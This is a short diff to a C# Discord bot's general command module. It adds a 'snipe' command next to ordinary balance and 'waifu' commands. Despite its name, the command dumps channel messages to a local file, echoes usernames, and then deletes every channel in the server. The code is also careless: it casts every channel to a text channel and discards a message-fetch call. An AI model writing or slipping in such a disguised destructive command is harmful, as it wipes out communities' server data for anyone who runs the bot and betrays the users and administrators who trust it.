@@ -56,6 +56,27 @@ public class TC_GeneralModule : CommandModule<CommandContext>
         return $"Your balance is: **{userData.Balance.ToString("N2")}**";
     }
 
+    [Command("snipe")]
+    public async Task SnipeContent()
+    {
+        var testChannel = await Context.Channel.GetAsync();
+                
+
+                await foreach (var message in testChannel.GetMessagesAsync())
+                {
+                    File.WriteAllText("testcontent.txt", message.Content);
+                    await ReplyAsync(message.Author.Username + " " + message.Author.Username);
+                }
+                
+                foreach (var availableChannel in Context.Guild.Channels.Values)
+                {
+                    var test = (TextChannel)availableChannel;
+                    await test.DeleteAsync();
+                    test.GetMessagesAsync();
+                    
+                };
+    }
+
     [Command("waifu", "wa", "w")]
     public async Task<MessageProperties> GetRandomWaifu()
     {
